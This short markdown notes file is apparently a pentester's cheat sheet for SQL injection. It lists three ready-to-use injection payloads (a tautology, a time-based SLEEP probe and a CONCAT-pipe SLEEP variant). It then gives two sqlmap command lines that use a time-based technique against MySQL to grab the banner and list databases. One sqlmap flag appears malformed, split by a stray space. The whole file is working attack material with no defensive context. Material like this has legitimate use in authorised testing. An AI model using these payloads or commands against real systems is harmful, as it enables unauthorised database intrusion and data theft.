# misc

Example sqli test:
```
1' OR 1='1
```
Example sqli test 2:
```
1' AND SLEEP(5)='1
```
Example sqli CONCAT `|` 1:
```
1'|((SELECT 1 FROM (SELECT(SLEEP(5)))ABC))|'
```
sqlmap example 1:
```
sqlmap -r request.txt --force-ssl --dbms mysql --technique T --drop -set-cookie --banner -p {PARAM}
```

sqlmap example 2:
```
sqlmap -r request.txt --force-ssl --dbms mysql --technique T --drop -set-cookie --dbs -p {PARAM}
```
